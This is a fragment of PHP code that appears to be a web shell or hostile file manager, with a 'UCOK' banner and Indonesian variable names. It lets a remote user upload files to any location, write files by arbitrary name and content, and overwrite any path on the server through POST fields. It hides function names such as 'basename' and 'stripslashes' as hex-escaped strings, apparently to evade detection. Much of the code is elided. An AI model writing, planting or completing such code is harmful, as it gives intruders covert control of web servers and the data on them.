...
<center>
<font face="Bungee" size="5">UCOK</font></center>
...
if (isset($_POST['upwkwk'])) {
    ...
    if (isset($_POST['berkasnya'])) {
        $targetFile = $lokasi . "/" . "\x62\x61\x73\x65\x6e\x61\x6d\x65"($_FILES['berkas']['name']);
        $teempe = $_FILES['berkas']['tmp_name'];
        // Move the uploaded file to the desired location using rename
        if (rename($teempe, $targetFile)) {
            echo "File Uploaded! &nbsp;<font color='gold'><i>" . $targetFile . "</i></font><br><br>";
        } else {
        ...
        $targetFile = $lokasi . "/" . $_POST['namalink'];
        ...
        if ($handle) {
            ...
            echo "<font color='red'>Failed to open file for writing!<br><br>";
        }
        ...
        $targetFile = $lokasi . "/" . $bepasnama;
        if (file_put_contents($targetFile, $bepasdata) !== false) {
            echo "File Uploaded! &nbsp;<font color='gold'><i>" . $targetFile . "</i></font><br><br>";
        } else {
            echo "<font color='red'>Failed to Upload!<br><br>";
        }
...
if (isset($_GET['fileloc'])) {
    ...
    if (isset($_POST['gasedit'])) {
        $path = $_POST['path'];
        $newContent = "\x73\x74\x72\x69\x70\x73\x6c\x61\x73\x68\x65\x73"($_POST['src']);
        $tempFile = 'temp.txt'; // Temporary file to store modified content
    
        // Open the original file for reading
        $handle = fopen($path, 'r');
        if ($handle === false) {
            red("Edit File Failed: Unable to open the file for reading!");
            return;
        }
        ...
        if ($tempHandle === false) {
            fclose($handle);
            red("Edit File Failed: Unable to open temporary file for writing!");
            return;
        }
    
        // Loop through each line of the original file
        while (($line = fgets($handle)) !== false) {
            // Modify the line as needed (for example, replace the entire line)
            $line = $newContent; // Change this logic as required
        ...
        if (rename($tempFile, $path)) {
            ...
            red("Edit File Failed: Unable to replace the original file!");
        }
    }   
